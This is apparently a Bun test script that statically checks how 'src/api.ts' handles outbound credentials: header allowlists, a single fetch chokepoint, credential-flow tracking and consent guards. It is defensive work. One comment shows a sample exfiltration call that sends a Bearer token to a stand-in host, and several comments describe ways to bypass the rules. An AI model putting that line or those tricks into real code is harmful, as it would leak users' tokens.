/**
 * CREDENTIAL SHAPE: the things about `src/api.ts` that a behavioural test
 * cannot say, asserted against its source.
 *
 * WHY THIS FILE IS IN `scripts/`. That is the point of it, so it goes first.
 *
 * `src/api.ts` attaches every outbound credential — the `Bearer` access token
 * and the `x-wego-id-token` identity assertion — and is deliberately NOT in
 * `.github/CODEOWNERS`: owning ~1,700 churning lines would put the three
 * release signers on nearly every pull request, the bottleneck the missing `*`
 * line exists to avoid. This repository is public and takes outside
 * contributions, so a plausible-looking change to where or under what condition
 * a credential is sent otherwise needs one ordinary reviewer.
 *
 * `scripts/` IS code-owned, so the gate and the thing that can weaken the gate
 * sit at different review bars: loosening credential handling in `src/api.ts`
 * fails this file, and silencing this file needs a release signer.
 *
 * WHAT BELONGS HERE, AND WHAT DOES NOT. This is the structural half of a pair.
 *
 *   - `src/api.test.ts` owns BEHAVIOUR, and owns it better than source-reading
 *     ever could: it drives the real functions through the injected `HttpFetch`
 *     and inspects the `Headers` that come out. "The Bearer header carries the
 *     token it was passed", "a declining user sends no id-token", "a refresh
 *     cannot turn the header on for someone who opted out" are all tested
 *     there, against running code, and they survive any refactor.
 *   - This file owns ABSENCE — the claims a behavioural test structurally
 *     cannot make, because you cannot call a function and observe the headers
 *     it DIDN'T send, or the request path that DOESN'T exist:
 *
 *         "no header leaves this file that is not on a list"
 *         "there is exactly one place that issues a request"
 *         "a credential never reaches a URL, a body, or any other call"
 *
 * An earlier version of this file also re-asserted the behavioural properties
 * structurally. That was duplication in a worse form — it failed four of five
 * behaviour-preserving edits while `src/api.test.ts` passed all five — so those
 * assertions are gone. Before adding a rule here, check whether it can be
 * written as a behavioural test in `src/api.test.ts` instead. If it can, it
 * belongs there.
 *
 * WHAT THIS DOES NOT PROTECT. A reader who over-trusts it is a worse outcome
 * than not having it:
 *
 *   - It asserts what it asserts. A sufficiently novel credential path can be
 *     written to satisfy every rule below — most obviously one that lives in
 *     another module entirely.
 *   - A reviewer still has to think. This narrows what can be done QUIETLY; it
 *     is friction and detection, not prevention.
 *   - It does not protect `src/api.ts` from a release signer, and is not meant
 *     to. The threat model is an outsider's pull request seen by one ordinary
 *     reviewer.
 *   - The collectors fail closed on shapes they cannot read, but "fails closed
 *     on what it can see" is still not "sees everything".
 *
 * The stronger fix is a separate, owned `src/api-credentials.ts`: an owned
 * module makes this class of change impossible rather than merely detectable,
 * and would reduce this file to its header allowlist. That is tracked
 * separately; this is what is cheap today.
 *
 * WHY A TYPE CHECKER. Two rules are about BINDING, not text — "this call
 * reaches the network through the injected parameter", "this value came from
 * the credential". Name matching cannot answer either, so symbols are resolved.
 * `typescript` already backs `bun run typecheck`, and `noResolve`/`noLib` keep
 * the program to this one file. `bun run test` runs only in unprivileged jobs —
 * `ci-cli`, and `release-cli.yml`'s `prepare`, which holds neither
 * `id-token: write` nor the store environment.
 */
import { describe, expect, it } from "bun:test";
import ts from "typescript";

const SOURCE_PATH = "src/api.ts";

const program = ts.createProgram([SOURCE_PATH], {
  noResolve: true,
  noLib: true,
  target: ts.ScriptTarget.Latest,
});
const checker = program.getTypeChecker();
const sourceFile = program.getSourceFile(SOURCE_PATH) as ts.SourceFile;

const where = (node: ts.Node): string => {
  const line = sourceFile.getLineAndCharacterOfPosition(
    node.getStart(sourceFile),
  ).line;
  return `${SOURCE_PATH}:${line + 1}`;
};

const normalize = (text: string): string => text.replace(/\s+/g, " ").trim();

/** A node with its location — the shape a failure message wants. */
const cite = (node: ts.Node): string =>
  `${where(node)}: ${normalize(node.getText(sourceFile))}`;

function* walk(node: ts.Node): Generator<ts.Node> {
  yield node;
  for (const child of node.getChildren(sourceFile)) yield* walk(child);
}

const allNodes = [...walk(sourceFile)];

/** The static text of a name or string-ish literal, or `undefined` when it is
 *  computed. Every allowlist below turns `undefined` into an unlistable name
 *  rather than skipping it, so a computed key fails instead of slipping past. */
function staticName(node: ts.Node | undefined): string | undefined {
  if (node === undefined) return undefined;
  if (ts.isIdentifier(node)) return node.text;
  if (ts.isStringLiteralLike(node)) return node.text;
  return undefined;
}

/** Header names are case-insensitive on the wire, so comparisons here are too. */
const headerKey = (name: string): string => name.toLowerCase();

/** Where an identifier is DECLARED, via the checker rather than by its text.
 *  `{ ...rest, token }` needs the shorthand detour: the identifier there is the
 *  PROPERTY's name, so asking about it directly returns the property symbol and
 *  the value being read is silently missed. */
function declarationOf(node: ts.Node): ts.Declaration | undefined {
  const target =
    ts.isIdentifier(node) && ts.isShorthandPropertyAssignment(node.parent)
      ? node.parent
      : node;
  const symbol = ts.isShorthandPropertyAssignment(target)
    ? checker.getShorthandAssignmentValueSymbol(target)
    : checker.getSymbolAtLocation(target);
  return symbol?.declarations?.[0];
}

/** True when `node` resolves to a parameter of `fn` itself. */
function isParameterOf(
  node: ts.Node,
  fn: ts.SignatureDeclaration | undefined,
): boolean {
  const declaration = declarationOf(node);
  return (
    declaration !== undefined &&
    fn !== undefined &&
    ts.isParameter(declaration) &&
    declaration.parent === fn
  );
}

/** The name of the nearest enclosing function, for grouping call sites. */
function enclosingFunctionName(node: ts.Node): string {
  for (let scope = node.parent; scope !== undefined; scope = scope.parent) {
    if (ts.isFunctionDeclaration(scope)) {
      return scope.name?.text ?? "<anonymous>";
    }
    if (ts.isFunctionExpression(scope) || ts.isArrowFunction(scope)) {
      return "<anonymous>";
    }
  }
  return "<module scope>";
}

// ---------------------------------------------------------------------------
// Header bags — what counts as one, and the rule that an unfamiliar one fails
// ---------------------------------------------------------------------------

/** Every identifier bound to a `new Headers(...)`. */
const headerBagNames = new Set(
  allNodes
    .filter(
      (node): node is ts.VariableDeclaration =>
        ts.isVariableDeclaration(node) &&
        node.initializer !== undefined &&
        ts.isNewExpression(node.initializer) &&
        staticName(node.initializer.expression) === "Headers",
    )
    .map((node) => staticName(node.name))
    .filter((name): name is string => name !== undefined),
);

/** The trailing name of a `.set(...)` receiver: `headers` for `headers.set`,
 *  `headers` for `init.headers.set`, `requestHeaders` for
 *  `requestHeaders.set`. */
function receiverName(expr: ts.Expression): string | undefined {
  if (ts.isIdentifier(expr)) return expr.text;
  if (ts.isPropertyAccessExpression(expr)) return expr.name.text;
  return undefined;
}

/** Every write to a header bag. Matched two ways because either alone leaves a
 *  hole: a bag called `h` slips a name rule, and one that is assigned rather
 *  than declared slips a `new Headers` rule. `res.headers.get(...)` is a READ
 *  of a response and is deliberately not here. */
const headerSetCalls = allNodes.filter((node): node is ts.CallExpression => {
  if (!ts.isCallExpression(node)) return false;
  if (!ts.isPropertyAccessExpression(node.expression)) return false;
  if (node.expression.name.text !== "set") return false;
  const name = receiverName(node.expression.expression);
  return (
    name !== undefined && (headerBagNames.has(name) || /headers?$/i.test(name))
  );
});

/** Every `headers:` property, whatever its value. The rules below reject the
 *  ones whose value is not a plain object literal rather than skipping them. */
const headerProperties = allNodes.filter(
  (node): node is ts.PropertyAssignment =>
    ts.isPropertyAssignment(node) && staticName(node.name) === "headers",
);

/** Every member of an inline header object, INCLUDING spreads — dropping them
 *  here is how a collector goes quiet. */
const inlineHeaderMembers = headerProperties
  .filter((node) => ts.isObjectLiteralExpression(node.initializer))
  .flatMap(
    (node) => (node.initializer as ts.ObjectLiteralExpression).properties,
  );

// ---------------------------------------------------------------------------
// The closed set of headers
// ---------------------------------------------------------------------------

/**
 * EVERY header name `src/api.ts` may attach through a header bag, and what each
 * carries. This list is why the file exists: it fails by DEFAULT on anything
 * new, so a header nobody anticipated cannot be added quietly.
 *
 * To add one: add it here, in the same pull request, with a line saying what it
 * carries. That edit is in `scripts/`, so it needs a release signer — which is
 * the review a new outbound header deserves.
 */
const ALLOWED_SET_HEADERS: Record<string, string> = {
  "user-agent": "build identification; carries no user data",
  "x-wego-session-id": "analytics uuid, pushed in per invocation",
  "x-wego-client-id": "analytics uuid, pushed in per invocation",
  "x-wego-app-version": "build version",
  "x-wego-os-type": "machine fact, not stored telemetry",
  "x-wego-os-version": "machine fact, not stored telemetry",
  "x-wego-timezone": "utc offset, computed per request",
  "x-wego-id-token": "THE identity assertion - gated below",
};

/** The same closed set for headers written inline into a `fetch` init object.
 *  A separate mechanism, so a separate list: a credential added there would
 *  never touch a `.set` call. */
const ALLOWED_LITERAL_HEADERS: Record<string, string> = {
  authorization: "THE access token",
  "content-type": "request body encoding, JSON on the POST path",
};

/** A header name as the allowlist sees it. A computed key becomes an unlistable
 *  string rather than a skipped entry, so it fails like any unknown name. */
const listedAs = (name: string | undefined, node: ts.Node): string =>
  name === undefined ? `<computed at ${where(node)}>` : headerKey(name);

describe("no header leaves this file without being listed here", () => {
  it("builds exactly one header bag", () => {
    // The NUMBER of bags is the property; the NAME is not. One bag is why
    // "every header this file sends" is a list somebody can finish reading.
    expect({ bags: [...headerBagNames], count: headerBagNames.size }).toEqual({
      bags: [...headerBagNames],
      count: 1,
    });
  });

  it("writes only allowlisted names to the header bag", () => {
    const names = headerSetCalls.map((call) =>
      listedAs(staticName(call.arguments[0]), call),
    );
    expect([...new Set(names)].sort()).toEqual(
      Object.keys(ALLOWED_SET_HEADERS).sort(),
    );
  });

  it("builds every inline header bag as a plain object literal", () => {
    // `headers: buildHeaders(token)` moves the decision somewhere this file
    // cannot see. Fail rather than skip: a bag the collector cannot read is the
    // case an allowlist is worth least in.
    const opaque = headerProperties
      .filter((node) => !ts.isObjectLiteralExpression(node.initializer))
      .map(cite);
    expect(opaque).toEqual([]);
  });

  it("writes every inline header as a named property, never a spread", () => {
    // `{ ...credentialHeaders, "Content-Type": "application/json" }` leaves the
    // name list unchanged while adding any header it likes.
    const unreadable = inlineHeaderMembers
      .filter((member) => !ts.isPropertyAssignment(member))
      .map(cite);
    expect(unreadable).toEqual([]);
  });

  it("writes only allowlisted names into inline header objects", () => {
    const names = inlineHeaderMembers
      .filter(ts.isPropertyAssignment)
      .map((prop) => listedAs(staticName(prop.name), prop));
    expect([...new Set(names)].sort()).toEqual(
      Object.keys(ALLOWED_LITERAL_HEADERS).sort(),
    );
  });
});

// ---------------------------------------------------------------------------
// One door, and a closed list of who may use it
// ---------------------------------------------------------------------------

/**
 * `src/api.test.ts` can prove the headers a request DOES carry. It cannot prove
 * that no other request exists — and this line satisfies every header rule
 * above while shipping the user's token to a host nobody chose:
 *
 *     await fetch("https://collector.example/ingest", {
 *       headers: { Authorization: `Bearer ${accessToken}` },
 *     });
 *
 * `src/target.ts` and `src/config.ts`, both already code-owned, decide which
 * host may receive a credential and refuse cleartext. This is what stops
 * `src/api.ts` going around them.
 */
const REQUEST_CHOKEPOINT = "fetchOrUnreachable";
const ALLOWED_CHOKEPOINT_CALLERS: Record<string, string> = {
  authedJsonGet: "the shared authenticated GET envelope",
  authedJsonPost: "the shared authenticated POST envelope",
};

const chokepoint = allNodes.find(
  (node): node is ts.FunctionDeclaration =>
    ts.isFunctionDeclaration(node) && node.name?.text === REQUEST_CHOKEPOINT,
);

describe("exactly one place issues a request", () => {
  it("references the global fetch only as the injected default", () => {
    // `http: HttpFetch = fetch` is the ONE permitted mention — it is what makes
    // the transport swappable, and what `src/api.test.ts` drives. Any other
    // `fetch` here is a second door.
    const stray = allNodes
      .filter(
        (node): node is ts.Identifier =>
          ts.isIdentifier(node) && node.text === "fetch",
      )
      .filter((node) => !ts.isParameter(node.parent))
      .map(cite);
    expect(stray).toEqual([]);
  });

  it("reaches the network only through the injected transport", () => {
    // Also pins that the chokepoint still exists: renamed away, the caller rule
    // below would otherwise stop applying silently.
    expect(chokepoint?.body).toBeDefined();
    const viaInjected = [...walk(chokepoint?.body as ts.Node)]
      .filter(ts.isCallExpression)
      .filter((call) => isParameterOf(call.expression, chokepoint));
    expect(viaInjected.map(where)).toHaveLength(1);
  });

  it("is reached only from the allowlisted callers", () => {
    // The fails-by-default half. A new request path — a new endpoint, a retry
    // helper, a "quick" health check — has to add its name here first.
    const callers = allNodes
      .filter(
        (node): node is ts.CallExpression =>
          ts.isCallExpression(node) &&
          staticName(node.expression) === REQUEST_CHOKEPOINT,
      )
      .map(enclosingFunctionName);
    expect([...new Set(callers)].sort()).toEqual(
      Object.keys(ALLOWED_CHOKEPOINT_CALLERS).sort(),
    );
  });
});

// ---------------------------------------------------------------------------
// Where a credential may travel
// ---------------------------------------------------------------------------

/** The parameter position an argument is passed into, or `undefined` when the
 *  node is not a call argument. */
function parameterReceiving(
  node: ts.Node,
): ts.ParameterDeclaration | undefined {
  const call = node.parent;
  if (call === undefined || !ts.isCallExpression(call)) return undefined;
  const index = call.arguments.indexOf(node as ts.Expression);
  if (index < 0) return undefined;
  const callee = declarationOf(call.expression);
  if (callee === undefined || !ts.isFunctionLike(callee)) return undefined;
  return callee.parameters[index];
}

/** True when `node` is the single interpolation of a `Bearer ` template — the
 *  one place a credential may become text. */
function isTheBearerInterpolation(node: ts.Node): boolean {
  const span = node.parent;
  if (span === undefined || !ts.isTemplateSpan(span)) return false;
  const template = span.parent;
  return (
    ts.isTemplateExpression(template) &&
    template.head.text === "Bearer " &&
    template.templateSpans.length === 1
  );
}

/**
 * THE CREDENTIAL PARAMETERS, derived rather than named — a guard that depends
 * on an identifier is a guard an ordinary rename switches off.
 *
 *   SEED     every parameter interpolated into a `Bearer ` template.
 *   CLOSURE  any parameter passed into a credential parameter's position is
 *            itself carrying the credential. Iterated to a fixed point, since
 *            the CLI threads the token down several layers.
 */
const credentialParams = new Set<ts.ParameterDeclaration>();

for (const node of allNodes) {
  if (!ts.isTemplateExpression(node)) continue;
  if (node.head.text !== "Bearer " || node.templateSpans.length !== 1) continue;
  const seed = declarationOf(node.templateSpans[0]?.expression as ts.Node);
  if (seed !== undefined && ts.isParameter(seed)) credentialParams.add(seed);
}

for (let growing = true; growing; ) {
  growing = false;
  for (const node of allNodes) {
    if (!ts.isIdentifier(node)) continue;
    const target = parameterReceiving(node);
    if (target === undefined || !credentialParams.has(target)) continue;
    const source = declarationOf(node);
    if (
      source !== undefined &&
      ts.isParameter(source) &&
      !credentialParams.has(source)
    ) {
      credentialParams.add(source);
      growing = true;
    }
  }
}

describe("a credential is only forwarded, or put in the Bearer header", () => {
  const references = allNodes
    .filter(ts.isIdentifier)
    .filter((node) => !ts.isParameter(node.parent))
    .filter((node) => {
      const declaration = declarationOf(node);
      return (
        declaration !== undefined &&
        ts.isParameter(declaration) &&
        credentialParams.has(declaration)
      );
    });

  it("found the credential parameters to check", () => {
    // Without this the rule below is vacuous: if the seed stops matching, the
    // set is empty, every filter yields nothing, and this goes green having
    // checked nothing at all.
    expect(credentialParams.size).toBeGreaterThan(0);
    expect(references.length).toBeGreaterThan(0);
  });

  it("never lets a credential reach a URL, a body, or any other call", () => {
    // The rule the header allowlists cannot express. A token concatenated into
    // a URL, packed into a JSON body, or handed to a logger never touches a
    // header at all — so every rule above stays silent on it.
    const escaped = references
      .filter((node) => {
        const target = parameterReceiving(node);
        const forwarded = target !== undefined && credentialParams.has(target);
        return !forwarded && !isTheBearerInterpolation(node);
      })
      .map(cite);
    expect(escaped).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Consent is never re-decided
// ---------------------------------------------------------------------------

/**
 * The one behavioural property that is ALSO kept here, deliberately.
 *
 * `src/api.test.ts` tests it properly — "a refresh cannot turn the header on
 * for someone who opted out" — but that file is unowned, so one pull request
 * could flip the behaviour and delete the test that noticed. Every other rule
 * in this file would stay green: the header name is allowlisted, no new request
 * appears, no credential moves. Silently sending an identity assertion for a
 * user who declined is the quietest bad change available in `src/api.ts`, which
 * is why it gets a second, owned guard.
 */
const CONSENT_CONJUNCTS = [
  "identityAssertion.allowed",
  "identityAssertion.token",
];

/** Flatten an `&&` chain into its operands, so `a && b` and `b && a` are the
 *  same guard — a rule that accepts one spelling only teaches people to edit
 *  the rule rather than read it. */
function conjunctsOf(expr: ts.Expression): string[] {
  if (
    ts.isBinaryExpression(expr) &&
    expr.operatorToken.kind === ts.SyntaxKind.AmpersandAmpersandToken
  ) {
    return [...conjunctsOf(expr.left), ...conjunctsOf(expr.right)];
  }
  return [normalize(expr.getText(sourceFile))];
}

const refresh = allNodes.find(
  (node): node is ts.FunctionDeclaration =>
    ts.isFunctionDeclaration(node) &&
    node.name?.text === "refreshIdentityAssertion",
);

const refreshNodes = refresh?.body === undefined ? [] : [...walk(refresh.body)];

describe("consent is never re-decided", () => {
  it("sends the identity assertion only under both conjuncts", () => {
    const idTokenSets = headerSetCalls.filter(
      (call) =>
        headerKey(staticName(call.arguments[0]) ?? "") === "x-wego-id-token",
    );
    expect(idTokenSets.map(where)).toHaveLength(1);

    // Scope, not proximity: an `if` whose ELSE branch holds the call, or one
    // the call merely follows, must not count.
    const guards: string[][] = [];
    let node: ts.Node = idTokenSets[0] as ts.Node;
    while (node.parent !== undefined) {
      const parent: ts.Node = node.parent;
      if (ts.isIfStatement(parent) && parent.thenStatement === node) {
        guards.push(conjunctsOf(parent.expression).sort());
      }
      node = parent;
    }
    expect(guards).toContainEqual([...CONSENT_CONJUNCTS].sort());
  });

  it("never gives `allowed` a value other than the one already stored", () => {
    // Reading the stored consent back is fine; deciding a new one is not. The
    // rule is about the VALUE, not the mention — `{ ...identityAssertion,
    // token }` and `{ token, allowed: identityAssertion.allowed }` are the same
    // program, and both must pass.
    expect(refresh?.body).toBeDefined();
    const CARRIED_FORWARD = "identityAssertion.allowed";

    const offenders = refreshNodes
      .filter((node) => {
        if (
          ts.isPropertyAssignment(node) &&
          staticName(node.name) === "allowed"
        ) {
          return (
            normalize(node.initializer.getText(sourceFile)) !== CARRIED_FORWARD
          );
        }
        // `{ allowed }` shorthand takes its value from a local, never from the
        // stored state, so it is always a new decision.
        if (
          ts.isShorthandPropertyAssignment(node) &&
          staticName(node.name) === "allowed"
        ) {
          return true;
        }
        if (
          ts.isBinaryExpression(node) &&
          node.operatorToken.kind === ts.SyntaxKind.EqualsToken &&
          ts.isPropertyAccessExpression(node.left) &&
          node.left.name.text === "allowed"
        ) {
          return normalize(node.right.getText(sourceFile)) !== CARRIED_FORWARD;
        }
        return false;
      })
      .map(cite);

    expect(offenders).toEqual([]);
  });

  it("uses no computed property name in the refresh", () => {
    // `{ ["allow" + "ed"]: true }` would sail past the rule above, and has no
    // legitimate use in a three-line function.
    const computed = refreshNodes
      .filter(
        (node) =>
          (ts.isPropertyAssignment(node) ||
            ts.isShorthandPropertyAssignment(node)) &&
          staticName(node.name) === undefined,
      )
      .map(cite);
    expect(computed).toEqual([]);
  });
});
